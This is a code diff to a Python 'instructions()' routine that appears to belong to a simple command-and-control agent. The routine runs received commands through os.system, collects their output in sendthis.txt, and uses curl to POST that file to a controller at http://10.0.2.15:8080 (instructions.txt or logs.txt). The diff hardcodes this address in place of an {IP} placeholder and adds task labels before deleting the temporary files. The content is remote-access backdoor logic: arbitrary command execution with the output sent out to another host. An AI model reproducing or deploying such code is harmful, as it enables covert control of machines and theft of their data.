@@ -74,15 +74,18 @@ def instructions():
 				for thing in commands[1:]:
 					mycommand += thing
 					mycommand += ' '
-				os.system("echo ' _Task_ ' >> sendthis.txt")
+				servecommand = mycommand.split('>>')[0]
+				taskwrap = "echo 'From Task: "+servecommand+"' >>sendthis.txt"
+				os.system(taskwrap)
 				os.system(mycommand)
-				os.system("echo ' _Task_ ' >> sendthis.txt")
 		if send == 1:
-			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
+			os.system("echo 'End Tasks' >> sendthis.txt")
+			os.system('curl --data-binary @./sendthis.txt http://10.0.2.15:8080/instructions.txt')
 		elif send == 0:
 			os.system("echo 'Status is Online' >> sendthis.txt")
-			os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/logs.txt')
+			os.system('curl --data-binary @./sendthis.txt http://10.0.2.15:8080/logs.txt')
 	os.system('rm sendthis.txt response.txt')
+
 
 
 
